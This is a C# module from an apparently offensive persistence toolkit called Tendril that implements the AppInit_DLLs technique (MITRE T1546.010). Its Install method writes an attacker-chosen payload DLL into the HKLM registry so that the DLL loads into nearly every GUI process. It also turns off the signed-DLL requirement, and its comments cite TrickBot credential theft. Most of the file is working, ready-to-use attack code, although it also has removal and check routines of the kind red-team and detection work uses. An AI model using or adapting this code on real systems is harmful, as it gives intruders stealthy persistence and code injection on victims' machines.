using System;
using System.Collections.Generic;
using Tendril.Core;
using Tendril.Utilities;

namespace Tendril.Modules
{
    /// <summary>
    /// AppInit_DLLs Persistence (T1546.010)
    ///
    /// DLL specified in AppInit_DLLs is loaded into every process that links
    /// user32.dll - which is nearly every GUI application. Two registry locations:
    ///   - HKLM (64-bit): ...Windows NT\CurrentVersion\Windows
    ///   - HKLM (32-bit WoW): ...Windows NT\CurrentVersion\Windows (Wow6432Node)
    ///
    /// Requires admin + LoadAppInit_DLLs must be set to 1. On Windows 8+ with
    /// Secure Boot, AppInit_DLLs only loads code-signed DLLs (RequireSignedAppInit_DLLs).
    /// Disable that check or sign the payload DLL.
    ///
    /// Still used by TrickBot operators (2023-2024) for credential theft via
    /// process-wide injection into browser processes.
    /// </summary>
    public class AppInitDlls : ITendril
    {
        public string Name { get { return "AppInitDlls"; } }
        public string Description { get { return "AppInit_DLLs - DLL loads into every user32.dll process"; } }
        public string MitreId { get { return "T1546.010"; } }
        public bool RequiresAdmin { get { return true; } }
        public bool IsReconOnly { get { return false; } }

        private const string RegPath64 = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows";
        private const string RegPath32 = @"SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows";

        public TendrilResult Install(Dictionary<string, string> options)
        {
            string dllPath;
            if (!options.TryGetValue("payload", out dllPath))
                return new TendrilResult(ResultStatus.Failed, Name, "Missing required option: /payload:<dll_path>");

            string archOpt;
            bool target32 = options.TryGetValue("arch", out archOpt) && archOpt == "x86";
            string regPath = target32 ? RegPath32 : RegPath64;

            // Append to existing value (space-separated list)
            string current = RegistryUtils.GetRegValue("HKLM", regPath, "AppInit_DLLs") ?? "";
            string newVal = string.IsNullOrEmpty(current.Trim()) ? dllPath : current.Trim() + " " + dllPath;

            bool ok = RegistryUtils.SetRegValue("HKLM", regPath, "AppInit_DLLs", newVal);
            if (!ok)
                return new TendrilResult(ResultStatus.Failed, Name, "Failed to write AppInit_DLLs (admin?)");

            // Enable loading
            RegistryUtils.SetRegDword("HKLM", regPath, "LoadAppInit_DLLs", 1);
            // Disable signature requirement (operator accepts the OPSEC cost)
            RegistryUtils.SetRegDword("HKLM", regPath, "RequireSignedAppInit_DLLs", 0);

            return new TendrilResult(ResultStatus.Success, Name,
                string.Format("AppInit_DLLs set: {0}", newVal))
                .WithMeta("DLL", dllPath)
                .WithMeta("Arch", target32 ? "x86" : "x64")
                .WithMeta("Key", @"HKLM\" + regPath);
        }

        public TendrilResult Remove(Dictionary<string, string> options)
        {
            string dllPath;
            if (!options.TryGetValue("payload", out dllPath))
            {
                // Clear everything
                RegistryUtils.SetRegValue("HKLM", RegPath64, "AppInit_DLLs", "");
                RegistryUtils.SetRegDword("HKLM", RegPath64, "LoadAppInit_DLLs", 0);
                RegistryUtils.SetRegValue("HKLM", RegPath32, "AppInit_DLLs", "");
                RegistryUtils.SetRegDword("HKLM", RegPath32, "LoadAppInit_DLLs", 0);
                return new TendrilResult(ResultStatus.Success, Name, "AppInit_DLLs cleared (both 64/32)");
            }

            // Remove specific DLL from the space-separated list
            foreach (string rp in new[] { RegPath64, RegPath32 })
            {
                string current = RegistryUtils.GetRegValue("HKLM", rp, "AppInit_DLLs") ?? "";
                if (current.Contains(dllPath))
                {
                    string cleaned = current.Replace(dllPath, "").Replace("  ", " ").Trim();
                    RegistryUtils.SetRegValue("HKLM", rp, "AppInit_DLLs", cleaned);
                    if (string.IsNullOrEmpty(cleaned))
                        RegistryUtils.SetRegDword("HKLM", rp, "LoadAppInit_DLLs", 0);
                }
            }
            return new TendrilResult(ResultStatus.Success, Name,
                string.Format("Removed {0} from AppInit_DLLs", dllPath));
        }

        public List<TendrilResult> Check()
        {
            var results = new List<TendrilResult>();
            foreach (var entry in new[] {
                new { Path = RegPath64, Label = "x64" },
                new { Path = RegPath32, Label = "x86" }
            })
            {
                string dlls = RegistryUtils.GetRegValue("HKLM", entry.Path, "AppInit_DLLs");
                string load = RegistryUtils.GetRegValue("HKLM", entry.Path, "LoadAppInit_DLLs");
                string signed = RegistryUtils.GetRegValue("HKLM", entry.Path, "RequireSignedAppInit_DLLs");

                if (!string.IsNullOrEmpty(dlls) && dlls.Trim().Length > 0)
                {
                    results.Add(new TendrilResult(
                        load == "1" ? ResultStatus.Warning : ResultStatus.Info, Name,
                        string.Format("AppInit_DLLs ({0}): {1}", entry.Label, dlls))
                        .WithMeta("Arch", entry.Label)
                        .WithMeta("LoadEnabled", load ?? "0")
                        .WithMeta("RequireSigned", signed ?? "unset"));
                }
            }
            return results;
        }
    }
}
